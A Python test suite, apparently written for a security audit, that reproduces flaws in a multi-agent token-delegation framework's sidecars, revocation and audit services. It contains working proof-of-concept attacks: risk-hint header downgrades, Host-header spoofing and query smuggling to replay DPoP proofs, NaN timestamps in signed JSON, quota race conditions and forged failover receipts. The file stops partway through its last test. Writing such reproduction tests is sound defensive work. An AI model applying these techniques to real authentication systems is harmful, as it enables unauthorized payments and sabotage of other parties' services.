"""Independent Adversarial QA & Boundary Verification Suite for Milestone 1 (`lineage/`).

Authored by: qa-inspector (read-only audit of business code; standalone tests in `lineage/reviews/`).
Purpose: Empirically verify suspected security, concurrency, protocol, and audit defects
across `common/`, `identity/`, `registry/`, `protocol/`, `revocation/`, `verifier/`,
`resilience/`, `audit/`, and `sidecar/`.
"""

from __future__ import annotations

import concurrent.futures
import json
import threading
import time
import unittest

import httpx

from lineage.audit import (
    AuditCollectorService,
    AuditEventType,
    AuditStreamEmitter,
    CausalChainAuditor,
)
from lineage.common.crypto import (
    CryptoError,
    KeyPair,
    b64url_decode,
    b64url_encode,
    canonical_json_bytes,
    jws_sign_compact,
)
from lineage.common.http_utils import HTTPRequestContext
from lineage.identity import TrustBundleResolver, TrustDomainCA
from lineage.protocol import (
    DPoPVerifier,
    MultiParentToken,
    PermissionLattice,
    create_dpop_proof,
    mint_root_token,
)
from lineage.registry import AgentCard, AgentCardError, AgentDirectoryClient, AgentDirectoryService
from lineage.resilience import (
    FailoverReceipt,
    FailureEvidence,
    FaultType,
    ResilientDelegationCoordinator,
    SkipLevelReceipt,
    ThreeLayerFaultDetector,
)
from lineage.revocation import RevocationReplicaClient, RevocationService
from lineage.sidecar import AgentSidecarNode, MCPToolSidecarNode
from lineage.verifier import LeafVerifier, VerificationMode


def _sign_raw_jws_unrestricted_json(
    payload_raw_json: str,
    keypair: KeyPair,
    typ: str,
    extra_headers: dict | None = None,
) -> str:
    """Sign raw JSON string (e.g., containing IEEE-754 NaN) with a valid keypair."""
    header = {"alg": keypair.alg, "typ": typ, "kid": keypair.kid}
    if extra_headers:
        header.update(extra_headers)
    h_b64 = b64url_encode(canonical_json_bytes(header))
    p_b64 = b64url_encode(payload_raw_json.encode("utf-8"))
    signing_input = f"{h_b64}.{p_b64}".encode("ascii")
    s_b64 = b64url_encode(keypair.sign_bytes(signing_input))
    return f"{h_b64}.{p_b64}.{s_b64}"


class Milestone1AdversarialQATests(unittest.TestCase):
    """Empirical reproduction tests for Milestone 1 QA findings."""

    def test_01_x_lct_risk_hint_downgrade_bypasses_high_risk_anchoring_and_fail_closed(self) -> None:
        """[CRITICAL] External caller setting `X-LCT-Risk-Hint: LOW` bypasses HIGH_RISK sync & fail-closed."""
        ca = TrustDomainCA("org-alpha.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca)

        w_drv = ca.issue_workload("/ns/entry/sa/drv")
        w_agent = ca.issue_workload("/ns/work/sa/agent-b")
        w_tool = ca.issue_workload("/ns/tool/sa/pay-mcp")
        w_rev = ca.issue_workload("/ns/sys/sa/rev")

        rev_svc = RevocationService(w_rev, resolver)
        rev_url = rev_svc.start()
        tool_node = MCPToolSidecarNode(
            identity=w_tool,
            trust_resolver=resolver,
            tools={"execute_payment": lambda args, _: {"paid": args.get("amount")}},
            mode=VerificationMode.ADAPTIVE_RISK_ANCHORED,
            revocation_url=rev_url,
        )
        tool_node.start()
        try:
            perms = PermissionLattice.create(tools=["execute_payment"], max_amount=5000.0)
            tok = mint_root_token(
                ca,
                "task-risk-downgrade",
                "user:alice",
                w_drv.jkt,
                w_agent.spiffe_id,
                w_agent.jkt,
                perms,
                hop_segment="B",
            ).encode_compact()

            # Revoke the task on RevocationService BEFORE local replica syncs!
            rev_svc.revoke_prefix_direct("/task-risk-downgrade", requested_by="user:alice", reason="compromised")
            self.assertEqual(tool_node.sidecar.verifier.trie.version, 0)

            # Attack Part A: Revoked holder sends `X-LCT-Risk-Hint: LOW` on `execute_payment(1000)`!
            dpop1 = create_dpop_proof(w_agent, "POST", tool_node.mcp_url, tok)
            resp_revoked_bypass = httpx.post(
                tool_node.mcp_url,
                json={
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "tools/call",
                    "params": {"name": "execute_payment", "arguments": {"amount": 1000.0}},
                },
                headers={
                    "Authorization": f"DPoP {tok}",
                    "DPoP": dpop1,
                    "X-LCT-Risk-Hint": "LOW",
                },
                timeout=5.0,
            )
            # VULNERABILITY CONFIRMED if status_code == 200 on a REVOKED high-risk payment!
            self.assertEqual(
                resp_revoked_bypass.status_code,
                200,
                "Expected reproduction: X-LCT-Risk-Hint: LOW bypassed synchronous revocation anchoring",
            )

            # Attack Part B: Stop RevocationService completely; verify normal call fails closed (503),
            # while `X-LCT-Risk-Hint: LOW` bypasses fail-closed and executes `execute_payment(2500)`!
            tok2 = mint_root_token(
                ca,
                "task-anchor-down",
                "user:alice",
                w_drv.jkt,
                w_agent.spiffe_id,
                w_agent.jkt,
                perms,
                hop_segment="B",
            ).encode_compact()
            rev_svc.stop()

            normal_resp = httpx.post(
                tool_node.mcp_url,
                json={
                    "jsonrpc": "2.0",
                    "id": 2,
                    "method": "tools/call",
                    "params": {"name": "execute_payment", "arguments": {"amount": 2500.0}},
                },
                headers={
                    "Authorization": f"DPoP {tok2}",
                    "DPoP": create_dpop_proof(w_agent, "POST", tool_node.mcp_url, tok2),
                },
                timeout=5.0,
            )
            self.assertEqual(normal_resp.status_code, 503)

            bypass_fail_closed = httpx.post(
                tool_node.mcp_url,
                json={
                    "jsonrpc": "2.0",
                    "id": 3,
                    "method": "tools/call",
                    "params": {"name": "execute_payment", "arguments": {"amount": 2500.0}},
                },
                headers={
                    "Authorization": f"DPoP {tok2}",
                    "DPoP": create_dpop_proof(w_agent, "POST", tool_node.mcp_url, tok2),
                    "X-LCT-Risk-Hint": "LOW",
                },
                timeout=5.0,
            )
            self.assertEqual(
                bypass_fail_closed.status_code,
                200,
                "Expected reproduction: X-LCT-Risk-Hint: LOW bypassed fail-closed 503 protection",
            )
        finally:
            tool_node.stop()
            rev_svc.stop()

    def test_02_dpop_host_header_cross_sidecar_and_path_replay(self) -> None:
        """[CRITICAL] Spoofed HTTP `Host` header fools `req.full_url`, allowing cross-sidecar & cross-path DPoP replay."""
        ca = TrustDomainCA("org-alpha.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca)

        w_drv = ca.issue_workload("/ns/entry/sa/drv")
        w_c = ca.issue_workload("/ns/work/sa/agent-c")
        w_tool1 = ca.issue_workload("/ns/tool/sa/weather-mcp")
        w_tool2 = ca.issue_workload("/ns/tool/sa/payment-mcp")

        tool1 = MCPToolSidecarNode(
            w_tool1,
            resolver,
            tools={"get_weather": lambda args, _: {"temp": 72}},
            mode=VerificationMode.LOCAL_FULL_CHAIN,
        )
        tool2 = MCPToolSidecarNode(
            w_tool2,
            resolver,
            tools={"execute_payment": lambda args, _: {"stolen_payment": args.get("amount")}},
            mode=VerificationMode.LOCAL_FULL_CHAIN,
        )
        tool1.start()
        tool2.start()
        try:
            perms = PermissionLattice.create(
                tools=["get_weather", "execute_payment"], max_amount=500.0
            )
            tok = mint_root_token(
                ca, "task-host-spoof", "user:alice", w_drv.jkt, w_c.spiffe_id, w_c.jkt, perms, hop_segment="C"
            ).encode_compact()

            # Legitimate DPoP proof created by C ONLY for `tool1` (`get_weather`)
            dpop_for_tool1 = create_dpop_proof(w_c, "POST", tool1.mcp_url, tok)
            r1 = httpx.post(
                tool1.mcp_url,
                json={"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "get_weather", "arguments": {}}},
                headers={"Authorization": f"DPoP {tok}", "DPoP": dpop_for_tool1},
                timeout=5.0,
            )
            self.assertEqual(r1.status_code, 200)

            # Compromised tool1 replays the EXACT SAME `(tok, dpop_for_tool1)` to `tool2`
            # with spoofed `Host: 127.0.0.1:<tool1_port>` AND swaps body to `execute_payment(450)`!
            tool1_host_port = tool1.sidecar.inbound_url.replace("http://", "")
            replay_to_tool2 = httpx.post(
                tool2.mcp_url,
                json={
                    "jsonrpc": "2.0",
                    "id": 99,
                    "method": "tools/call",
                    "params": {"name": "execute_payment", "arguments": {"amount": 450.0}},
                },
                headers={
                    "Host": tool1_host_port,
                    "Authorization": f"DPoP {tok}",
                    "DPoP": dpop_for_tool1,
                },
                timeout=5.0,
            )
            self.assertEqual(
                replay_to_tool2.status_code,
                200,
                "Expected reproduction: Host header spoofing allowed cross-service DPoP replay + body swap",
            )

            # Also verify path smuggling via `Host: <host>:<port>/other/path?swallow=`
            dpop_wrong_path = create_dpop_proof(
                w_c, "POST", f"{tool2.sidecar.inbound_url}/a2a/task", tok
            )
            tool2_host_port = tool2.sidecar.inbound_url.replace("http://", "")
            path_smuggle_resp = httpx.post(
                tool2.mcp_url,
                json={
                    "jsonrpc": "2.0",
                    "id": 100,
                    "method": "tools/call",
                    "params": {"name": "execute_payment", "arguments": {"amount": 100.0}},
                },
                headers={
                    "Host": f"{tool2_host_port}/a2a/task?swallow=",
                    "Authorization": f"DPoP {tok}",
                    "DPoP": dpop_wrong_path,
                },
                timeout=5.0,
            )
            self.assertEqual(
                path_smuggle_resp.status_code,
                200,
                "Expected reproduction: Query injection in Host header bypassed DPoP path binding",
            )
        finally:
            tool1.stop()
            tool2.stop()

    def test_03_unprivileged_lateral_revocation_and_cross_domain_quarantine_dos(self) -> None:
        """[CRITICAL] Unrelated low-privilege workload in org-beta.io can revoke org-alpha tasks & quarantine org-alpha Coordinator."""
        ca_alpha = TrustDomainCA("org-alpha.io")
        ca_beta = TrustDomainCA("org-beta.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca_alpha)
        resolver.register_domain_ca(ca_beta)

        w_coord_alpha = ca_alpha.issue_workload("/ns/coord/sa/coord-a")
        w_untrusted_beta = ca_beta.issue_workload("/ns/sandbox/sa/untrusted-leaf")
        w_rev = ca_alpha.issue_workload("/ns/sys/sa/rev")

        rev_svc = RevocationService(w_rev, resolver)
        dir_svc = AgentDirectoryService(resolver)
        rev_url = rev_svc.start()
        dir_url = dir_svc.start()
        try:
            dir_client = AgentDirectoryClient(dir_url, resolver)
            rev_client = RevocationReplicaClient(rev_url, resolver)

            coord_card = AgentCard.sign_and_create(
                w_coord_alpha, "Alpha Coordinator", "http://127.0.0.1:19500", ["coord.root"]
            )
            dir_client.register(coord_card)

            # 1. Untrusted beta leaf revokes Alpha's entire task `/task-alpha-secret`!
            ev_prefix = rev_client.revoke_prefix(
                w_untrusted_beta, "/task-alpha-secret", reason="malicious_sabotage"
            )
            self.assertIsNotNone(
                rev_svc.trie.check_lineage_path("/task-alpha-secret/CoordA/Worker1")
            )
            self.assertEqual(ev_prefix.requested_by, w_untrusted_beta.spiffe_id)

            # 2. Untrusted beta leaf globally quarantines Alpha's Coordinator in RevocationService!
            rev_client.quarantine_workload(
                w_untrusted_beta, w_coord_alpha.spiffe_id, reason="lateral_dos"
            )
            self.assertIsNotNone(rev_svc.trie.check_workloads([w_coord_alpha.spiffe_id]))

            # 3. Untrusted beta leaf permanently quarantines Alpha's Coordinator in AgentDirectoryService!
            dir_client.quarantine(w_untrusted_beta, w_coord_alpha.spiffe_id, "lateral_dos")
            self.assertEqual(dir_client.discover(skill="coord.root"), [])
            # Even version-bumped re-registration by Alpha Coordinator is permanently blocked!
            coord_card_v2 = AgentCard.sign_and_create(
                w_coord_alpha, "Alpha Coordinator", "http://127.0.0.1:19500", ["coord.root"], version=2
            )
            with self.assertRaises(AgentCardError):
                dir_client.register(coord_card_v2)
        finally:
            rev_svc.stop()
            dir_svc.stop()

    def test_04_inbound_sidecar_missing_holder_check_bricks_dag_and_bypasses_parent(self) -> None:
        """[CRITICAL] Agent inbound routes fail to verify `token.holder_spiffe_id == self.spiffe_id`."""
        ca = TrustDomainCA("org-alpha.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca)

        w_drv = ca.issue_workload("/ns/entry/sa/drv")
        w_a = ca.issue_workload("/ns/coord/sa/a")
        w_b1 = ca.issue_workload("/ns/mid/sa/b1")
        w_c = ca.issue_workload("/ns/dag/sa/aggregator-c")
        w_rogue_m = ca.issue_workload("/ns/other/sa/branch-m")
        w_tool = ca.issue_workload("/ns/tool/sa/ledger-tool")

        invoked_on_c: list[str] = []

        def _c_handler(node: AgentSidecarNode, req: HTTPRequestContext, body: dict):
            if body.get("op") == "run_converged":
                return node.sidecar_call_tool_converged(
                    task_id=str(req.header("X-LCT-Task-Id")),
                    sub=str(req.header("X-LCT-Sub")),
                    target_mcp_url=tool_node.mcp_url,
                    tool_name="read_ledger",
                    arguments={},
                )
            invoked_on_c.append(str(req.header("X-LCT-Lineage-Path")))
            return 200, {"executed_on_c": True}

        a_node = AgentSidecarNode(w_a, resolver, "A", ["coord"], lambda *_: (200, {}))
        c_node = AgentSidecarNode(w_c, resolver, "C", ["converge"], _c_handler)
        tool_node = MCPToolSidecarNode(
            w_tool,
            resolver,
            tools={"read_ledger": lambda args, _: {"ok": True}},
            mode=VerificationMode.LOCAL_FULL_CHAIN,
        )
        a_node.start(register_in_directory=False)
        c_node.start(register_in_directory=False)
        tool_node.start()
        try:
            perms = PermissionLattice.create(tools=["read_ledger"])
            t_root = mint_root_token(
                ca, "task-dag-poison", "user:alice", w_drv.jkt, w_a.spiffe_id, w_a.jkt, perms, hop_segment="A"
            )
            # Legitimate branch delegated to C: A -> B1 -> C (holder = C)
            t_b1_to_c = t_root.attenuate(
                w_a, w_b1.spiffe_id, w_b1.jkt, perms, hop_segment="B1"
            ).attenuate(w_b1, w_c.spiffe_id, w_c.jkt, perms, hop_segment="C")

            # Sibling branch delegated ONLY to M: A -> M (holder = M, NOT C!)
            t_m = t_root.attenuate(
                w_a, w_rogue_m.spiffe_id, w_rogue_m.jkt, perms, hop_segment="M"
            )
            compact_m = t_m.encode_compact()

            # Subtest A: M invokes C's `/a2a/task` using `t_m` (holder = M != C) -> 200 OK!
            task_url_c = f"{c_node.endpoint}/a2a/task"
            r_unauth_exec = httpx.post(
                task_url_c,
                json={"op": "ping"},
                headers={
                    "Authorization": f"DPoP {compact_m}",
                    "DPoP": create_dpop_proof(w_rogue_m, "POST", task_url_c, compact_m),
                },
                timeout=5.0,
            )
            self.assertEqual(r_unauth_exec.status_code, 200)
            self.assertEqual(invoked_on_c, ["/task-dag-poison/A/M"])

            # Subtest B: B1 delivers legitimate branch to C's `/a2a/converge`,
            # THEN M posts `t_m` (holder = M != C) to C's `/a2a/converge` -> poisons C's inbox!
            conv_url_c = f"{c_node.endpoint}/a2a/converge"
            compact_b1_c = t_b1_to_c.encode_compact()
            r_legit_conv = httpx.post(
                conv_url_c,
                json={"branch_data": {"from": "B1"}},
                headers={
                    "Authorization": f"DPoP {compact_b1_c}",
                    "DPoP": create_dpop_proof(w_b1, "POST", conv_url_c, compact_b1_c),
                },
                timeout=5.0,
            )
            self.assertEqual(r_legit_conv.status_code, 200)

            r_poison_conv = httpx.post(
                conv_url_c,
                json={"branch_data": {"from": "M_poison"}},
                headers={
                    "Authorization": f"DPoP {compact_m}",
                    "DPoP": create_dpop_proof(w_rogue_m, "POST", conv_url_c, compact_m),
                },
                timeout=5.0,
            )
            self.assertEqual(
                r_poison_conv.status_code,
                200,
                "Expected reproduction: /a2a/converge accepted foreign-holder token",
            )

            # Now when C tries to assemble MultiParentToken for `task-dag-poison`, it crashes with 400!
            r_trigger = httpx.post(
                task_url_c,
                json={"op": "run_converged"},
                headers={
                    "Authorization": f"DPoP {compact_b1_c}",
                    "DPoP": create_dpop_proof(w_b1, "POST", task_url_c, compact_b1_c),
                },
                timeout=5.0,
            )
            self.assertEqual(
                r_trigger.status_code,
                400,
                "Expected reproduction: poisoned convergence_inbox bricked MultiParentToken assembly",
            )
            self.assertEqual(r_trigger.json()["error"], "convergence_assembly_failed")

            # Subtest C: Grandchild C (`A -> B1 -> C`) posts directly to A's `/v1/task-result`,
            # bypassing direct parent B1 AND bypassing SkipLevelReceipt!
            res_url_a = f"{a_node.endpoint}/v1/task-result"
            r_bypass_parent = httpx.post(
                res_url_a,
                json={"task_id": "task-dag-poison", "result": {"unreviewed_by_b1": True}},
                headers={
                    "Authorization": f"DPoP {compact_b1_c}",
                    "DPoP": create_dpop_proof(w_c, "POST", res_url_a, compact_b1_c),
                },
                timeout=5.0,
            )
            self.assertEqual(r_bypass_parent.status_code, 200)
            self.assertEqual(len(a_node.sidecar.get_direct_results("task-dag-poison")), 1)
        finally:
            a_node.stop()
            c_node.stop()
            tool_node.stop()

    def test_05_malicious_child_false_skip_level_evades_healthy_parent_and_revokes_it(self) -> None:
        """[HIGH] Healthy parent B1 is bypassed AND auto-revoked by Ancestor A when C lies in SkipLevelReceipt."""
        ca = TrustDomainCA("org-alpha.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca)

        dir_svc = AgentDirectoryService(resolver)
        rev_svc = RevocationService(ca.issue_workload("/ns/sys/sa/rev"), resolver)
        dir_url = dir_svc.start()
        rev_url = rev_svc.start()

        w_drv = ca.issue_workload("/ns/entry/sa/drv")
        w_a = ca.issue_workload("/ns/coord/sa/a")
        w_b1 = ca.issue_workload("/ns/mid/sa/healthy-b1")
        w_c = ca.issue_workload("/ns/leaf/sa/rogue-c")

        a_node = AgentSidecarNode(
            w_a, resolver, "Ancestor A", ["coord"], lambda *_: (200, {}), directory_url=dir_url, revocation_url=rev_url
        )
        b1_node = AgentSidecarNode(
            w_b1, resolver, "Healthy B1", ["mid"], lambda *_: (200, {}), directory_url=dir_url, revocation_url=rev_url
        )
        a_card = a_node.start()
        b1_card = b1_node.start()
        try:
            # Verify B1 is 100% healthy!
            self.assertEqual(httpx.get(f"{b1_node.endpoint}/healthz").status_code, 200)

            perms = PermissionLattice.create(tools=["calc"])
            t0 = mint_root_token(
                ca,
                "task-false-skip",
                "user:alice",
                w_drv.jkt,
                w_a.spiffe_id,
                w_a.jkt,
                perms,
                hop_segment="A",
                first_hop_public_jwk=w_a.public_jwk(),
                first_hop_return_endpoint=a_card.return_endpoint,
            )
            t_b1 = t0.attenuate(
                w_a, w_b1.spiffe_id, w_b1.jkt, perms, hop_segment="B1", issuer_return_endpoint=a_card.return_endpoint
            )
            t_c = t_b1.attenuate(
                w_b1, w_c.spiffe_id, w_c.jkt, perms, hop_segment="C", issuer_return_endpoint=b1_card.return_endpoint
            )

            # C never contacts healthy B1; C fabricates FailureEvidence and sends SkipLevelReceipt to A!
            fake_ev = FailureEvidence(
                failed_spiffe_id=w_b1.spiffe_id,
                failed_endpoint=b1_node.endpoint,
                fault_type=FaultType.CRASH,
                error_detail="Forged crash claim while B1 is alive",
                attempt_count=1,
                observed_at=time.time(),
            )
            forged_skip = SkipLevelReceipt.create_and_sign(
                child_identity=w_c,
                lineage_token=t_c,
                skipped_ancestors=[w_b1.spiffe_id],
                target_ancestor_spiffe_id=w_a.spiffe_id,
                failure_evidence=fake_ev,
                result_payload={"unreviewed_payload": "bypassed_b1_guardrail"},
            )
            skip_url = f"{a_node.endpoint}/v1/skip-level-return"
            compact_tc = t_c.encode_compact()
            resp = httpx.post(
                skip_url,
                json={"skip_level_receipt": forged_skip.to_dict()},
                headers={"DPoP": create_dpop_proof(w_c, "POST", skip_url, compact_tc)},
                timeout=5.0,
            )
            self.assertEqual(resp.status_code, 200)
            # A accepted C's unreviewed result AND A assassinated healthy B1's lineage prefix!
            self.assertIsNotNone(
                rev_svc.trie.check_lineage_path("/task-false-skip/A/B1"),
                "Expected reproduction: Ancestor A auto-revoked healthy B1 based on C's unverified lie",
            )
        finally:
            a_node.stop()
            b1_node.stop()
            dir_svc.stop()
            rev_svc.stop()

    def test_06_max_calls_quota_toctou_race_and_reattenuation_amplification(self) -> None:
        """[HIGH] `max_calls` bypassed via (A) concurrent TOCTOU race, (B) sibling re-attenuation, (C) DAG branch sum."""
        ca = TrustDomainCA("org-alpha.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca)

        w_drv = ca.issue_workload("/ns/e/sa/drv")
        w_a = ca.issue_workload("/ns/c/sa/a")
        w_b1 = ca.issue_workload("/ns/c/sa/b1")
        w_b2 = ca.issue_workload("/ns/c/sa/b2")
        w_c = ca.issue_workload("/ns/c/sa/c")
        w_tool = ca.issue_workload("/ns/t/sa/tool")

        htu = "http://127.0.0.1:19876/mcp"
        verifier = LeafVerifier(
            w_tool.spiffe_id, resolver, self_jkt=w_tool.jkt, mode=VerificationMode.LOCAL_FULL_CHAIN
        )

        # --- Subtest A: Concurrent TOCTOU race on `max_calls=1` ---
        # Use standard Python concurrency stress quantum (`sys.setswitchinterval(1e-6)`) to deterministically
        # exercise thread preemption between `_quota.peek_next` (line 555) and `_quota.commit_increment` (line 569)!
        import sys

        p_one = PermissionLattice.create(
            tools=["pay"],
            allowed_scopes=["s"],
            param_whitelist={f"p{k}": ["v"] for k in range(20)},
            max_calls=1,
        )
        race_args = {"scopes": ["s"] * 2000, **{f"p{k}": ["v"] * 200 for k in range(20)}}
        tok_race = mint_root_token(
            ca, "task-quota-race", "user:alice", w_drv.jkt, w_c.spiffe_id, w_c.jkt, p_one, hop_segment="C"
        ).encode_compact()

        proofs = [create_dpop_proof(w_c, "POST", htu, tok_race) for _ in range(16)]
        barrier = threading.Barrier(16)

        def _fire(idx: int) -> bool:
            barrier.wait()
            res = verifier.verify_request(
                tok_race, proofs[idx], "POST", htu, tool="pay", arguments=race_args
            )
            return res.allowed

        orig_interval = sys.getswitchinterval()
        sys.setswitchinterval(1e-6)
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=16) as pool:
                allowed_count = sum(1 for ok in pool.map(_fire, range(16)) if ok)
        finally:
            sys.setswitchinterval(orig_interval)

        self.assertGreater(
            allowed_count,
            1,
            f"Expected TOCTOU race to allow >1 calls on max_calls=1 (got {allowed_count})",
        )

        # --- Subtest B: Deterministic Offline Re-Attenuation Quota Amplification (`max_calls=1` -> 5x!) ---
        t0_strict = mint_root_token(
            ca, "task-quota-amp", "user:alice", w_drv.jkt, w_a.spiffe_id, w_a.jkt, p_one, hop_segment="A"
        )
        # RootBlock B_0 strictly caps `max_calls = 1`!
        # Yet A offline-mints 5 attenuated tokens to C (each gets a fresh `jti` -> distinct `leaf_block_hash`)
        amp_successes = 0
        for i in range(5):
            child_tok = t0_strict.attenuate(
                w_a, w_c.spiffe_id, w_c.jkt, p_one, hop_segment=f"C-{i}"
            ).encode_compact()
            res = verifier.verify_request(
                child_tok,
                create_dpop_proof(w_c, "POST", htu, child_tok),
                "POST",
                htu,
                tool="pay",
                arguments={},
            )
            if res.allowed:
                amp_successes += 1

        self.assertEqual(
            amp_successes,
            5,
            "Expected reproduction: 5 calls succeeded despite RootBlock max_calls=1",
        )

        # --- Subtest C: MultiParentToken sums quotas across branches sharing RootBlock (`max_calls=1` -> 2x!) ---
        t0_dag = mint_root_token(
            ca, "task-quota-dag", "user:alice", w_drv.jkt, w_a.spiffe_id, w_a.jkt, p_one, hop_segment="A"
        )
        ch1 = t0_dag.attenuate(w_a, w_b1.spiffe_id, w_b1.jkt, p_one, hop_segment="B1").attenuate(
            w_b1, w_c.spiffe_id, w_c.jkt, p_one, hop_segment="C"
        )
        ch2 = t0_dag.attenuate(w_a, w_b2.spiffe_id, w_b2.jkt, p_one, hop_segment="B2").attenuate(
            w_b2, w_c.spiffe_id, w_c.jkt, p_one, hop_segment="C"
        )
        mpt = MultiParentToken.assemble_and_sign(w_c, [ch1, ch2]).encode_compact()
        dag_ok = sum(
            1
            for _ in range(2)
            if verifier.verify_request(
                mpt, create_dpop_proof(w_c, "POST", htu, mpt), "POST", htu, tool="pay", arguments={}
            ).allowed
        )
        self.assertEqual(
            dag_ok,
            2,
            "Expected reproduction: MultiParentToken executed 2 calls under RootBlock max_calls=1",
        )

    def test_07_nan_timestamp_bypasses_dpop_revocation_quarantine_and_crashes_verifier(self) -> None:
        """[HIGH] IEEE-754 `NaN` bypasses timestamp checks in DPoP, RevocationService, AgentDirectory, and crashes LeafVerifier."""
        ca = TrustDomainCA("org-alpha.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca)
        w_c = ca.issue_workload("/ns/c/sa/c")
        w_rev = ca.issue_workload("/ns/sys/sa/rev")

        # 1. DPoP proof with `"iat": NaN` never expires (even 10 years in the future!)
        tok_str = "lct1.dummy"
        from lineage.common.crypto import sha256_b64url

        ath = sha256_b64url(tok_str.encode("ascii"))
        htu = "http://127.0.0.1:18080/mcp"
        raw_dpop_json = (
            f'{{"ath":"{ath}","htm":"POST","htu":"{htu}","iat":NaN,"jti":"nan-dpop-1"}}'
        )
        nan_dpop = _sign_raw_jws_unrestricted_json(
            raw_dpop_json,
            w_c.keypair,
            typ="dpop+jwt",
            extra_headers={"jwk": w_c.public_jwk()},
        )
        dpop_verifier = DPoPVerifier()
        info = dpop_verifier.verify_proof(
            nan_dpop, "POST", htu, tok_str, w_c.jkt, now=time.time() + 315_360_000.0
        )
        self.assertEqual(info["jti"], "nan-dpop-1")

        # 2. AgentDirectoryService `/v1/agents/quarantine` accepts canonical `"iat": "nan"` forever!
        dir_svc = AgentDirectoryService(resolver)
        dir_url = dir_svc.start()
        rev_svc = RevocationService(w_rev, resolver)
        rev_url = rev_svc.start()
        try:
            q_cmd = jws_sign_compact(
                {"target_spiffe_id": "spiffe://org-alpha.io/ns/x/sa/victim", "iat": "nan"},
                w_c.keypair,
                typ="lct-quarantine+jwt",
            )
            r_dir = httpx.post(
                f"{dir_url}/v1/agents/quarantine",
                json={"reporter_svid": w_c.workload_svid, "command_jws": q_cmd},
                timeout=3.0,
            )
            self.assertEqual(r_dir.status_code, 200)

            # 3. RevocationService `/v1/revoke/prefix` accepts raw `"iat": NaN` forever!
            rev_cmd = _sign_raw_jws_unrestricted_json(
                '{"prefix":"/task-nan","reason":"immortal","iat":NaN}',
                w_c.keypair,
                typ="lct-revoke-cmd+jwt",
            )
            r_rev = httpx.post(
                f"{rev_url}/v1/revoke/prefix",
                json={"auth_mode": "workload", "caller_svid": w_c.workload_svid, "command_jws": rev_cmd},
                timeout=3.0,
            )
            self.assertEqual(r_rev.status_code, 200)
        finally:
            dir_svc.stop()
            rev_svc.stop()

        # 4. LeafVerifier.verify_request crashes with unhandled `CryptoError` (500) on `NaN` in token `iat`!
        valid_tok = mint_root_token(
            ca,
            "task-nan-crash",
            "user:alice",
            w_c.jkt,
            w_c.spiffe_id,
            w_c.jkt,
            PermissionLattice.create(tools=["t1"]),
            hop_segment="C",
        )
        raw_dict_text = b64url_decode(valid_tok.encode_compact()[5:]).decode("utf-8")
        # Replace numeric `"iat":...` with `"iat":NaN`
        obj = json.loads(raw_dict_text)
        obj["root"]["iat"] = float("nan")
        nan_wire = "lct1." + b64url_encode(json.dumps(obj, allow_nan=True).encode("utf-8"))
        lv = LeafVerifier(
            "spiffe://org-alpha.io/ns/t/sa/tool",
            resolver,
            mode=VerificationMode.LOCAL_FULL_CHAIN,
        )
        with self.assertRaises(CryptoError):
            lv.verify_request(
                nan_wire,
                create_dpop_proof(w_c, "POST", htu, nan_wire),
                "POST",
                htu,
                tool="t1",
            )

    def test_08_auditor_forged_failover_and_audit_collector_poisoning_dos(self) -> None:
        """[HIGH] CausalChainAuditor accepts forged FailoverReceipt (`revocation_event_sig='fake'`) & AuditCollector lacks auth."""
        ca = TrustDomainCA("org-alpha.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca)

        w_drv = ca.issue_workload("/ns/e/sa/drv")
        w_a = ca.issue_workload("/ns/c/sa/a")
        w_rogue = ca.issue_workload("/ns/evil/sa/rogue")

        p0 = PermissionLattice.create(tools=["t1"])
        t0 = mint_root_token(ca, "task-aud-01", "user:alice", w_drv.jkt, w_a.spiffe_id, w_a.jkt, p0, hop_segment="A")

        em_root = AuditStreamEmitter(ca)
        em_rogue = AuditStreamEmitter(w_rogue)

        em_root.emit(
            AuditEventType.ROOT_MINT,
            "task-aud-01",
            "user:alice",
            t0.lineage_path,
            0,
            0,
            t0.root_block_hash,
            t0.leaf_block_hash,
            "ALLOW",
            permissions_summary=p0.to_dict(),
        )

        # Rogue node (not even in task-aud-01!) fabricates a FailoverReceipt with `revocation_event_sig="FAKE_SIG"`
        # without ever contacting RevocationService, and emits REVOCATION_ISSUED *after* FAILOVER_PRUNE_GRAFT!
        fake_fr = FailoverReceipt.create_and_sign(
            parent_identity=w_rogue,
            task_id="task-aud-01",
            pruned_lineage_path="/task-aud-01/A/B1",
            revocation_version=999,
            revocation_event_sig="NOT_A_REAL_REVOCATION_SERVICE_SIGNATURE",
            failed_delegate_spiffe_id=w_a.spiffe_id,
            substitute_delegate_spiffe_id=w_rogue.spiffe_id,
            new_lineage_path="/task-aud-01/A/Rogue-e1",
            old_epoch=0,
            new_epoch=1,
            failure_evidence=FailureEvidence(
                failed_spiffe_id=w_a.spiffe_id,
                failed_endpoint="http://127.0.0.1:9",
                fault_type=FaultType.CRASH,
                error_detail="fake",
                attempt_count=1,
                observed_at=time.time(),
            ),
        )
        em_rogue.emit(
            AuditEventType.FAILOVER_PRUNE_GRAFT,
            "task-aud-01",
            "user:alice",
            "/task-aud-01/A/Rogue-e1",
            1,
            1,
            t0.root_block_hash,
            "forged-block-hash",
            "RECOVERED",
            receipt_payload=fake_fr.to_dict(),
            timestamp=100.0,
        )
        em_rogue.emit(
            AuditEventType.REVOCATION_ISSUED,
            "task-aud-01",
            "user:alice",
            "/task-aud-01/A/B1",
            1,
            0,
            t0.root_block_hash,
            "forged-block-hash",
            "REVOKED",
            action_detail={"target": "/task-aud-01/A/B1"},
            timestamp=200.0,  # Logged AFTER graft!
        )

        auditor = CausalChainAuditor(resolver)
        rep = auditor.audit(em_root.local_entries() + em_rogue.local_entries())
        self.assertTrue(rep.clean)
        self.assertIn(
            "VERIFIED_FAILOVER_GRAFT",
            rep.tasks["task-aud-01"].resilience_classifications,
            "Expected reproduction: Auditor accepted fake revocation_event_sig from unauthorized node",
        )

        # Unauthenticated AuditCollectorService log poisoning DoS against legitimate task!
        collector = AuditCollectorService()
        col_url = collector.start()
        try:
            for entry in em_root.local_entries():
                collector.append_direct(entry)
